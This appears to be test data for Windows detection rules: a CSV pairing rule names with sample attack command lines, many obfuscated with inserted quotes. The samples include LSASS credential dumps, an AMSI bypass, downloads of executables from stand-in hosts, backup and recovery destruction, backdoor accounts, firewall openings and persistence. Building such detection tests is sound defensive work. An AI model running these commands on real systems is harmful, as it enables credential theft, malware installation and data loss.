Folder,CommandLine
win_interactive_at,at 00:00 /interactive cmd.exe /c ipconfig
win_local_system_owner_account_discovery,cmdkey.exe /l
win_local_system_owner_account_discovery,cmd.exe /c "dir" \Users\
win_local_system_owner_account_discovery,net u"se"r
win_local_system_owner_account_discovery,cmdkey /list
win_local_system_owner_account_discovery,cmd.exe /c dir \Users\
win_local_system_owner_account_discovery,cmdkey -list
win_local_system_owner_account_discovery,net user
win_local_system_owner_account_discovery,cmdkey.exe /list
win_lsass_dump,procdump.exe l"sa"ss -o de"fnotlsa"ss.dmp
win_lsass_dump,procdump ls"as"s -o ma"lsa"ss.dmp
win_lsass_dump,procdump.exe lsass -o lsass.dmp
win_lsass_dump,procdump lsass -o malsass.dmp
win_lsass_dump,procdump.exe ls""ass -o l"sa"ss."dmp"
win_lsass_dump,procdump.exe lsass -o defnotlsass.dmp
win_mal_adwind,cscript %TEMP%\Retrive2646804049303142888.vbs 
win_mal_adwind,cs"cri"pt.exe %TEMP%\Ret"ri"ve2670234531104625201.v"bs" 
win_mal_adwind,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v cRwUMdaPVwP /t REG_EXPAND_SZ /d "\"\AppData\Roaming\Oracle\bin\javaw.exe \" -jar \"%USERPROFILE%\sgazsBZvxHC\GKPKtwfspIg.ddKgDj\"" /f
win_mal_adwind,cscript.exe %TEMP%\Retrive2670234531104625201.vbs 
win_mal_adwind,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v cRwUMdaPVwP /t REG_EXPAND_SZ /d "\"\App"Dat"a\Ro"ami"ng\Or"ac"le\bin\ja"vaw.ex"e \" -jar \"%USERPROFILE%\sgazsBZvxHC\GKPKtwfspIg.ddKgDj\"" /f
win_mal_adwind,cscript.exe %TEMP%\Retrive2646804049303142888.vbs 
win_malware_emotet,powershell -w hidden -enco JABG"AGw"AeAByAGgAYwBmAGQAPQAnAEEAZQBwAG8AcQBhAHcAcABjAHkAcgBrACcAOwAkAFYAdwBnAHkAbwBzAGwAcwBzAGgAbgBzACAAPQAgACcANwA3ACcAOwAkAFMAbwByAHcAeAB1AHUAcQBzAD0AJwBXAHQAcwB4AG4AcgBwAGwAeQBqAGMAeABjACcAOwAkAEkAbgBhAHcAbgBqAHQAbABhAD0AJA"BlAG"4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQArACc
win_malware_emotet,powershell -e P"AA"jACAAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AbQBpAGMAcgBvAHMAbwBmAHQALgBjAG8AbQAvACAAIwA+ACAAJABZAFgAVQBRAEMAQgBRAFoAdwBEAD0AJwBWAGMAQQAxAFUAdwAxAFoAJwA7ACQAVQA0AFoAVQBrADQAQQBvADEANAB3AHcAQgAgAD0AIAAnADcAOAA0ACcAOwAkAFYAYwA0AHgAQQBHAEEAQQA9ACcAQwBCAF8AVQBBAFUAQQBjAGsAQQBBACcAOwAkAE4ARABVAF8AUQBHAEQAUQA9ACQAZQBuAHYAOg"B1"AHMA"ZQ"ByAHAAcgBvAGYAaQBsAGUAKwAnAFwAJwArACQAV
win_malware_emotet,powershell -enco AvACcA"Lg"AiAHMAYABwAEwAaQBUACIA"KAAn"ACoAJwApADsAJABMAFoAYwBaAEcAQQBBADEAUQ
win_malware_emotet,powershell -enco kAGUAbgB2ADoAdQBz"AGUA"cgBwAH"IA"bwBmAGkAbABlA
win_malware_emotet,powershell -enco PAAjACAAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AbQBpAGMAcgBvAHMAbwBmAHQALgBjAG8AbQAvACAAIwA
win_malware_emotet,powershell -e PAAjACAAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AbQBpAGMAcgBvAHMAbwBmAHQALgBjAG8AbQAvACAAIwA+ACAAJABZAFgAVQBRAEMAQgBRAFoAdwBEAD0AJwBWAGMAQQAxAFUAdwAxAFoAJwA7ACQAVQA0AFoAVQBrADQAQQBvADEANAB3AHcAQgAgAD0AIAAnADcAOAA0ACcAOwAkAFYAYwA0AHgAQQBHAEEAQQA9ACcAQwBCAF8AVQBBAFUAQQBjAGsAQQBBACcAOwAkAE4ARABVAF8AUQBHAEQAUQA9ACQAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUAKwAnAFwAJwArACQAV
win_malware_emotet,powershell -""enco PAAjACAAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AbQBpAGMAcgBvAHMAbwBmAHQALgBjAG8AbQAvACAAIwA
win_malware_emotet,powershell -w hidden -enco iACgAJ"wA"qACcAKQA7ACQA
win_malware_emotet,powershell -enco kAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlA
win_malware_emotet,powershell -w hidden -enco JABGAG"wAeAByAGgAYwBmAGQAPQAnAEEAZQBwAG8AcQ"BhAHcAcABjAH
win_malware_emotet,powershell -enco AvACcALgAiAHMAYABwAEwAaQBUACIAKAAnACoAJwApADsAJABMAFoAYwBaAEcAQQBBADEAUQ
win_malware_emotet,powershell -enco IgAoA"CcAK"gAn"ACk"AOwAkA
win_malware_emotet,powershell -w hidden -enco iACgAJwAqACcAKQA7ACQA
win_malware_emotet,powershell -w hidden -enco JABGAGwAeAByAGgAYwBmAGQAPQAnAEEAZQBwAG8AcQBhAHcAcABjAHkAcgBrACcAOwAkAFYAdwBnAHkAbwBzAGwAcwBzAGgAbgBzACAAPQAgACcANwA3ACcAOwAkAFMAbwByAHcAeAB1AHUAcQBzAD0AJwBXAHQAcwB4AG4AcgBwAGwAeQBqAGMAeABjACcAOwAkAEkAbgBhAHcAbgBqAHQAbABhAD0AJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQArACc
win_malware_emotet,powershell -w hidden -enco JABGAGwAeAByAGgAYwBmAGQAPQAnAEEAZQBwAG8AcQBhAHcAcABjAH
win_malware_emotet,powershell -enco IgAoACcAKgAnACkAOwAkA
win_malware_ryuk,REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "svchos" /t REG_SZ /d "C:\us"er"s\Pu"bl"ic\QsibK.exe" /f 
win_malware_ryuk,REG ADD "HKEY_CURRENT_USER\SOFTWARE\Mi"cros"oft\W"ind"ows\Curre"ntVersi"on\Run" /v "svchos" /t REG_SZ /d "C:\us"er"s\Pu"bl"ic\QsibK.exe" /f 
win_malware_ryuk,REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "svchos" /t REG_SZ /d "C:\users\Public\QsibK.exe" /f 
win_malware_ryuk,REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "svchos" /t REG_SZ /d "C:\users\Public\QsibK.exe" /f 
win_malware_ryuk,REG ADD "HKEY_CURRENT_USER\SOFTWARE\Mic"roso"ft\Wi"nd"ows\Cur"rent"Version\R"u"n" /v "svchos" /t REG_SZ /d "C:\users\Public\QsibK.exe" /f 
win_malware_ryuk,REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "svchos" /t REG_SZ /d "C:\users\Public\QsibK.exe" /f 
win_malware_script_dropper,cscript C:\\Us"er"s\myuser\notmalicious."vbe" input
win_malware_script_dropper,wscript C:\ProgramData\SystemHelper\performance.vba boost
win_malware_script_dropper,wscript "C:\Us"ers\Tom\service."j"s update
win_malware_script_dropper,cscript C:\ProgramData\installer."jse" install
win_malware_script_dropper,cscript.exe "C":\U"se"rs\Alice\helper.v"b"a run
win_malware_script_dropper,cscript "C:\ProgramData\System\update.vbs" install
win_malware_script_dropper,wscript.exe C:\Users\Mustermann\Desktop\hello.jse param
win_malware_script_dropper,wscript C:\Users\Tom\service.js update
win_malware_script_dropper,wscript.exe "C":\\\Us""ers\\Mustermann\Desktop\hello.j"s"e param
win_malware_script_dropper,wscript C:\\ProgramData\ABCStudio\ABCStudio.v"b"e install
win_malware_script_dropper,cscript.exe C:\Users\Alice\helper.vba run
win_malware_script_dropper,cscript "C:\Pr"ogramData\MovieWatcher\MovieWatcher."js" start
win_malware_script_dropper,cscript C:\ProgramData\installer.jse install
win_malware_script_dropper,wscript.exe C:\\\Users\Bob\Desktop\helper.vbs install
win_malware_script_dropper,wscript C:\ProgramData\ABCStudio\ABCStudio.vbe install
win_malware_script_dropper,cscript C:\Users\myuser\notmalicious.vbe input
win_malware_script_dropper,wscript C:\\ProgramData\SystemHelper\performance."vba" boost
win_malware_script_dropper,cscript C:\ProgramData\MovieWatcher\MovieWatcher.js start
win_malware_script_dropper,wscript.exe C:\Users\Bob\Desktop\helper.vbs install
win_malware_script_dropper,cscript C:\ProgramData\System\update.vbs install
win_malware_trickbot_recon_activity,nltest "/domain_trusts" /all"_"trusts
win_malware_trickbot_recon_activity,nltest.exe "/domain_trusts"   "/all_trusts"
win_malware_trickbot_recon_activity,nltest.exe /domain_trusts /all_trusts
win_malware_trickbot_recon_activity,nltest.exe /domain_trusts /all_trusts
win_malware_trickbot_recon_activity,nltest.exe /domain_trusts    /all_trusts
win_malware_trickbot_recon_activity,nltest /domain_trusts /all_trusts
win_malware_wannacry,b""cd"ed"it.exe   /"set"  "{de"fau"lt"}   re"cover"yen"able"d   n""o
win_malware_wannacry,w"bad"min.exe   de"le"te    ca"tal"og    -"qu"iet
win_malware_wannacry,icacls . /grant Everyone:F /T /C /Q
win_malware_wannacry,wbadmin delete catalog -quiet
win_malware_wannacry,i"cac"ls . "/grant"    "Eve"ryone:"F"   "/T"    /""Q    "/"C
win_malware_wannacry,bcdedit /set {default} recoveryenabled no
win_net_enum,net.exe vi""ew
win_net_enum,net v"ie"w /all
win_net_enum,net view
win_net_enum,net view /all
win_net_enum,net v""i"e"w
win_net_enum,net.exe view
win_net_user_add,C:\Windows\System32\net1 us""er /a"d"d srvcusr usrpsswrd123
win_net_user_add,net u"s"er /a""dd name passwd
win_net_user_add,net user /add mynewuser secretpasswd123
win_net_user_add,net user /add name passwd
win_net_user_add,net u""s"e"r /add mynewusr secretpasswd123
win_net_user_add,C:\Windows\System32\net1 user /add srvcusr usrpsswrd
win_netsh_allow_port_rdp,n""e"t"sh adv""fire"wal"l fire""wa"ll" a""d"d" r"u"l""e ac""tion=a""l"l"ow p"ro"tocol=T"C"P loc"al"port="3"38""9 dir=in name=rlnm
win_netsh_allow_port_rdp,netsh.exe advf fi add rule acti=allow protoc=TCP localp=3389 dir=in name=RDP
win_netsh_allow_port_rdp,netsh advfirewall firewall add rule action=allow protocol=TCP localport=3389 dir=in name=allowRDP
win_netsh_allow_port_rdp,netsh.exe advfirewall firewall add rule action=allow protocol=TCP localport=3389 dir=in name=RDP
win_netsh_allow_port_rdp,netsh advfirewall   firewall   add   rule action=allow protocol=TCP localport=3389 dir=in name=allowRDP
win_netsh_allow_port_rdp,netsh advfirewall firewall add rule action=allow protocol=TCP localport=3389 dir=in name=rlnm
win_netsh_fw_add,netsh advfirewall firewall    add rule action=allow protocol=UDP localport=1337 dir=in name=rulename
win_netsh_fw_add,n"ets"h.exe advfirewall fi"rewa"ll   a"d"d rule action=allow protocol=TCP localport=4242 dir=in name=nicerule
win_netsh_fw_add,netsh advfirewall firewall add rule action=allow protocol=TCP localport=4711 dir=in name=mfwrl
win_netsh_fw_add,netsh.exe advfirewall firewall add rule action=allow protocol=TCP localport=4242 dir=in name=nicerule
win_netsh_fw_add,n"et"sh advfirewall fire""wall a"d"d rule action=allow protocol=TCP localport=4711 dir=in name=mfwrl
win_netsh_fw_add,netsh advfirewall firewall add rule action=allow protocol=UDP localport=1337 dir=in name=rulename
win_netsh_packet_capture,netsh t s c=y
win_netsh_packet_capture,n""e"ts"h t s cap=yes
win_netsh_packet_capture,netsh.exe trace start capture=yes
win_netsh_packet_capture,netsh trace start cap=yes
win_netsh_packet_capture,n"ets"h.exe t""ra"c"e st"ar"t capture=yes
win_netsh_packet_capture,netsh trace start capture=yes
win_netsh_port_fwd,n"et"sh inter""face po"rtpr"oxy a"d"d v4"to"v4 listenport=1337 connectaddress=127.0.0.1 connectport=2448
win_netsh_port_fwd,netsh i p a v listenport=4242 connectaddress=127.0.0.1 connectport=4343
win_netsh_port_fwd,netsh interface portproxy add v4tov4 listenport=4711 connectaddress=127.0.0.1 connectport=4712
win_netsh_port_fwd,netsh interface portproxy add v4tov4 listenport=4242 connectaddress=127.0.0.1 connectport=4343
win_netsh_port_fwd,netsh.exe    interface     portproxy     add      v4tov4 listenport=4711 connectaddress=127.0.0.1 connectport=4712
win_netsh_port_fwd,netsh interface portproxy add v4tov4 listenport=1337 connectaddress=127.0.0.1 connectport=2448
win_netsh_port_fwd_3389,ne"ts"h interface portproxy add listenport=3"38"9 connectaddress=127.0.0.1 connectport=3390
win_netsh_port_fwd_3389,netsh interface portproxy add connectaddress=127.0.0.1 connectport=4711 listenport=3389
win_netsh_port_fwd_3389,netsh interface portproxy add listenport=3389 c=127.0.0.1 connectp=33389
win_netsh_port_fwd_3389,netsh interface portproxy add listenport=3389 connectaddress=127.0.0.1 connectport=4711
win_netsh_port_fwd_3389,netsh.exe    interface portproxy add listenport=3389 c=127.0.0.1 connectp=33389
win_netsh_port_fwd_3389,netsh interface portproxy add listenport=3389 connectaddress=127.0.0.1 connectport=3390
win_netsh_wifi_credential_harvesting,net"sh" "w"lan show profile name=WLAN-XYZ432 key="clear"
win_netsh_wifi_credential_harvesting,net"sh"   w"la"n    show  profile name=WLAN-0B1W4N key  =   c"le"ar
win_netsh_wifi_credential_harvesting,netsh wlan show profile name=WLAN-1A2B3C key=clear
win_netsh_wifi_credential_harvesting,netsh wlan show profile name=WLAN-0B1W4N key=clear
win_netsh_wifi_credential_harvesting,netsh    wlan    show profile name=WLAN-1A2B3C key  =   clear    
win_netsh_wifi_credential_harvesting,netsh wlan show profile name=WLAN-XYZ432 key=clear
win_network_sniffing,tshark -"i" Ethernet
win_network_sniffing,C:\Program Files\Wireshark\tshark.exe --"inter"face "Local Area Connection* 7"
win_network_sniffing,tshark.exe -i Ethernet
win_network_sniffing,C:\Program Files\Wireshark\tshark.exe --interface "Local Area Connection* 7"
win_network_sniffing,tshark.exe -"i" Ethernet
win_network_sniffing,tshark -i Ethernet
win_new_service_creation,sc.exe create niceservice b""in"Pa"th=C:\Path\To\Binary.exe
win_new_service_creation,powershell -c "New"-s"erv"ic""e MyPsService C:\Destination\some.exe
win_new_service_creation,sc.exe create mynewservice binPath=C:\Path\To\Binary.exe
win_new_service_creation,powershell -c New-Service MyPsService C:\Destination\some.exe
win_new_service_creation,sc.exe c"re"a""te mynewservice binPath=C:\Path\To\Binary.exe
win_new_service_creation,sc.exe create niceservice binPath=C:\Path\To\Binary.exe
win_possible_applocker_bypass,Install"Ut"il.exe /logfile= /LogToConsole=false /U AllTheThings.dll
win_possible_applocker_bypass,C:\Windows\System32\reg"sv"cs.exe AllTheThingsx64.dll
win_possible_applocker_bypass,C:\Windows\Microsoft.NET\Framework64\v2.0.50727\i"eexe"c.exe http://x.x.x.x:8080/bypass.exe
win_possible_applocker_bypass,C:\Windows\Microsoft.NET\Framework\v2.0.50727\re"gasm".exe /U AllTheThingsx64.dll
win_possible_applocker_bypass,C:\Windows\System32\msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE
win_possible_applocker_bypass,C:\Windows\System32\regsvcs.exe AllTheThingsx64.dll
win_possible_applocker_bypass,m"sd"t.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE
win_possible_applocker_bypass,C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe /U AllTheThingsx64.dll
win_possible_applocker_bypass,C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe http://x.x.x.x:8080/bypass.exe
win_possible_applocker_bypass,C:\Windows\Microsoft.NET\Framework\v2.0.50727\msbu"ild".exe project.csproj
win_possible_applocker_bypass,C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
win_possible_applocker_bypass,C:\Windows\Microsoft.NET\Framework\v2.0.50727\msbuild.exe project.csproj
win_powershell_amsi_bypass,powershell -C [Ref].Assembly.GetType('http://System.Management.Automation.AmsiUtils').GetField('amsi"Init"Failed';'NonPublic;Static').SetValue($null;$true)
win_powershell_amsi_bypass,powershell -C [Ref].Assembly.GetType('http://Sys""tem.Mana"gem"ent.Automation.AmsiUtils').GetField('ams"iI"nitFailed';'NonPublic;Static').SetValue($null;$true)
win_powershell_amsi_bypass,powershell -C [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed';'NonPublic;Static').SetValue($null;$true)
win_powershell_amsi_bypass,powershell -C [Ref].Assembly.GetType('http://System.Management.Automation.AmsiUtils').GetField('amsiInitFailed';'NonPublic;Static').SetValue($null;$true)
win_powershell_amsi_bypass,powershell -C [Ref].Assembly.GetType('"Sys"tem."Management"."Auto"mation.AmsiUtils').GetField('amsiInitFailed';'NonPublic;Static').SetValue($null;$true)
win_powershell_amsi_bypass,powershell -C [Ref].Assembly.GetType('http://System.Management.Automation.AmsiUtils').GetField('amsiInitFailed';'NonPublic;Static').SetValue($null;$true)
win_powershell_bitsjob,powershell.exe -Command St""art-B"its"Trans"f"er -Source http://another.remote/backdoor.exe -Destination C:\Temp\thisisfine.exe
win_powershell_bitsjob,powershell.exe -Command Start-B"i"tsTransfer -Source http://my.host/custom.dll -Destination C:\Temp\nice.dll
win_powershell_bitsjob,powershell.exe -Command Start-BitsTransfer -Source http://remote.host/mal.exe -Destination C:\Temp\notmal.exe
win_powershell_bitsjob,powershell.exe -Command Start-BitsTransfer -Source http://my.host/custom.dll -Destination C:\Temp\nice.dll
win_powershell_bitsjob,powershell.exe -Command S"tar"t-Bi"t"s""Tra"ns"fer -Source http://remote.host/mal.exe -Destination C:\Temp\notmal.exe
win_powershell_bitsjob,powershell.exe -Command Start-BitsTransfer -Source http://another.remote/backdoor.exe -Destination C:\Temp\thisisfine.exe
win_powershell_downgrade_attack,powershell -ve"rs"io 2 -Command Get-Date
win_powershell_downgrade_attack,powershell "-versi"   2 -Command Get-Host
win_powershell_downgrade_attack,powershell -ve   2 -Command Get-Host
win_powershell_downgrade_attack,powershell -v 2 -Command Get-Date
win_powershell_downgrade_attack,powershell -version 2 -Command Get-Host
win_powershell_downgrade_attack,powershell -versi 2 -Command Get-Host
win_powershell_downgrade_attack,powershell -version   2 -Command Get-Host
win_powershell_downgrade_attack,powershell -vers 2 -Command Get-Date
win_powershell_downgrade_attack,powershell -ve 2 -Command Get-Host
win_powershell_downgrade_attack,powershell -"ver"   2 -Command Get-Host
win_powershell_downgrade_attack,powershell -version 2 -Command Get-Date
win_powershell_downgrade_attack,powershell -ver 2 -Command Get-Host
win_powershell_download,powershell.exe -C (N"e"w-Object     System."Net".Web"cli"ent)."Download"File(remote.url/malicious.txt; output.txt)
win_powershell_download,powershell.exe -C (New-"Object"     Net.Webclient).Down"loadS"tring(server.org/my.file)
win_powershell_download,powershell.exe -C (New-Ob"je"ct    Net.We"bcl"ient).D"own"loa"dF"ile(somewhere.com/some.exe; output.exe)
win_powershell_download,powershell.exe -C (New-Object System.Net.Webclient).DownloadString(remote.url/malicious.txt)
win_powershell_download,powershell.exe -C (New-Object Net.Webclient).DownloadString(server.org/my.file)
win_powershell_download,powershell.exe -C (New-O"bj"ect     S"yst"em."Net".W"eb"client)."Down"load"String"(remote.url/malicious.txt)
win_powershell_download,powershell.exe -C (New-Object Net.Webclient).DownloadFile(somewhere.com/some.exe; output.exe)
win_powershell_download,powershell.exe -C (New-Object System.Net.Webclient).DownloadFile(remote.url/malicious.txt; output.txt)
win_powershell_frombase64string,powershell.exe -C [System.Text.Encoding]::Unicode.GetString([Convert]::F"rom"Base64"String"('Y21k')))
win_powershell_frombase64string,powershell.exe -C [System.Text.Encoding]::Unicode.GetString([Convert]::From"Base"64"St"ring('Y21k')))
win_powershell_frombase64string,powershell.exe -C [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABF')))
win_powershell_frombase64string,powershell.exe -C [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('Y21k')))
win_powershell_frombase64string,powershell.exe -C [System.Text.Encoding]::Unicode.GetString([Convert]::Fr"omBa"se"64"String('JABF')))
win_powershell_frombase64string,powershell.exe -C [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('Y21k')))
win_powershell_suspicious_parameter_variation,powershell "/NoProf" ipconfig
win_powershell_suspicious_parameter_variation,powershell.exe /nonint Get-Date
win_powershell_suspicious_parameter_variation,powershell.exe -enc aQBwAGMAbwBuAGYAaQBnAA==
win_powershell_suspicious_parameter_variation,powershell.exe -windowstyle h notepad.exe
win_powershell_suspicious_parameter_variation,powershell.exe -nonint Get-Date
win_powershell_suspicious_parameter_variation,powershell.exe "/windowstyle" 1 notepad.exe
win_powershell_suspicious_parameter_variation,powershell.exe -ec aQBwAGMAbwBuAGYAaQBnAA==
win_powershell_suspicious_parameter_variation,powershell -NoProf ipconfig
win_powershell_xor_commandline,powershell -C -j"oi"n('a'; 'b')
win_powershell_xor_commandline,powershell -C [c"ha"r]4711
win_powershell_xor_commandline,powershell -C 3 -bxor 1
win_powershell_xor_commandline,powershell -C [char]4711
win_powershell_xor_commandline,powershell -C 3 -b"xo"r 1
win_powershell_xor_commandline,powershell -C -join('a'; 'b')
win_powersploit_empire_schtasks,"C:\Windows\system32\schtasks.exe" /create /sc daily /tr powershell.exe /tn goodupdater
win_powersploit_empire_schtasks,"C:\Windows\system32\schtasks.exe" -create /tn updatertask -sc onidle /tr powershell.exe
win_powersploit_empire_schtasks,"C:\Windows\system32\schtasks.exe" /create -sc updater /tn updatertask -tr powershell.exe
win_powersploit_empire_schtasks,"C:\Windows\system32\schtasks.exe" /create /sc onlogon /tn myupdater /tr powershell.exe
win_powersploit_empire_schtasks,"C:\Windows\system32\schtasks.exe" /create /sc onidle /tn updatertask /tr powershell.exe
win_powersploit_empire_schtasks,"C:\Windows\system32\schtasks.exe" -create -sc onlogon -tn myupdater -tr powershell.exe
win_powersploit_empire_schtasks,"C:\Windows\system32\schtasks.exe" /create /sc updater /tn updatertask /tr powershell.exe
win_powersploit_empire_schtasks,"C:\Windows\system32\schtasks.exe" /create /sc daily /tn goodupdater /tr powershell.exe
win_process_creation_bitsadmin_download,cmd /c copy   "bit"sad"min.e"xe C:\Destination\bitsadmin.exe
win_process_creation_bitsadmin_download,cmd /c copy System32\bitsadmin.exe C:\Destination\bitsadmin.exe
win_process_creation_bitsadmin_download,bitsadmin /transfer jobname http://domain/file C:\file
win_process_creation_bitsadmin_download,cmd /c copy bitsadmin.exe C:\Destination\bitsadmin.exe
win_process_creation_bitsadmin_download,bitsadmin "/transfer" jobname http://domain/file C:\file
win_process_creation_bitsadmin_download,cmd /c copy bitsadmin.exe C:\Destination\bitsadmin.exe
win_process_dump_rundll32_comsvcs,rundll32.exe "comsvcs.dll";#24 654 lsass.dmp full
win_process_dump_rundll32_comsvcs,rundll32.exe "comsvcs.dll"; Minidump 136 my.dmp full
win_process_dump_rundll32_comsvcs,rundll32.exe comsvcs.dll;Minidump 600 dumpfile.dmp full
win_process_dump_rundll32_comsvcs,rundll32.exe comsvcs.dll;Minidump 136 my.dmp full
win_process_dump_rundll32_comsvcs,rundll32.exe comsvcs.dll;   Minidump 600 dumpfile.dmp full
win_process_dump_rundll32_comsvcs,rundll32.exe comsvcs.dll;#24 654 lsass.dmp full
win_query_registry,reg s"av"e HKLM\Software\Microsoft\Windows\CurrentVer""sion\RunSer"vic"esOnce C:\Temp\regsave.txt
win_query_registry,reg export HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run explexp.reg
win_query_registry,reg e"xp"ort HKLM\Software\Microsoft\Windows\Cur"rent"Version\Run""Services myexport.reg
win_query_registry,reg exp"or"t HKLM\Software\Microsoft\Windows\CurrentVersion\R"un"Once exp.reg
win_query_registry,reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Win"log"on\Notify"
win_query_registry,reg q"u"ery HKLM\system\curren"tcon"tro""lset\ser"vic"es
win_query_registry,reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
win_query_registry,reg export HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices myexport.reg
win_query_registry,reg q""u"e"ry "HKLM\SOFTWARE\Microsoft\Windows NT\Current"Ver"sion\Win"do"ws"
win_query_registry,reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Ru"nOnceE"x
win_query_registry,reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"
win_query_registry,reg save HKLM\Software\Microsoft\Windows\CurrentVersion\R""un save_cv_run.reg
win_query_registry,reg export HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce exp.reg
win_query_registry,reg s"av"e HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell"Service"ObjectDelayLoad ssodl.reg
win_query_registry,reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
win_query_registry,reg save HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce C:\Temp\regsave.txt
win_query_registry,reg ex""port HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\R""un explexp.reg
win_query_registry,reg save HKLM\Software\Microsoft\Windows\CurrentVersion\Run save_cv_run.reg
win_query_registry,reg save  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad ssodl.reg
win_query_registry,reg query HKLM\system\currentcontrolset\services
win_redmimicry_winnti_proc,cmd /c C:\Wi"nd"ows\T""emp\t"m"p.b"a"t
win_redmimicry_winnti_proc,cmd /c C:\\Wi"nd"ows\\\T"em"p\\t""mp.bat
win_redmimicry_winnti_proc,cmd /c C:\Windows\Temp\tmp.bat
win_redmimicry_winnti_proc,cmd /c C:\Windows\Temp\tmp.bat
win_redmimicry_winnti_proc,cmd /c C:\\Windows\\\Temp\\tmp.bat
win_redmimicry_winnti_proc,cmd /c C:\Windows\Temp\tmp.bat
win_remote_time_discovery,w32tm -"t"z
win_remote_time_discovery,powershell /c Get-Da"t"e
win_remote_time_discovery,net time \hostname
win_remote_time_discovery,powershell /c Get-Date
win_remote_time_discovery,net "ti"me \hostname
win_remote_time_discovery,w32tm -tz
win_run_powershell_script_from_ads,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "Get-Content C:\BREACH\userbehavior.log -Str""eam ''"
win_run_powershell_script_from_ads,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "G""et-C""on""tent C:\BREACH\userbe""havio""r.log -S""tr""eam ''"
win_run_powershell_script_from_ads,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "Get-Content C:\BREACH\userbehavior.log -Stream ''"
win_run_powershell_script_from_ads,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -C "Get-Content baz.txt -Stream ''"
win_run_powershell_script_from_ads,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "Get-Con""tent C:\BREACH\userbehavior.log -Stream ''"
win_run_powershell_script_from_ads,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c "Get-Content -Stream '' d:\foo.bar"
win_service_execution,net "start" "windows audio"
win_service_execution,C:\Windows\System32\net1 "start" "windows audio"
win_service_execution,C:\Windows\System32\net1 start "windows audio"
win_service_execution,C:\Windows\system32\net1.exe START  "windows search"
win_service_execution,C:\Windows\System32\net.exe "start" foo
win_service_execution,net  start "windows search"
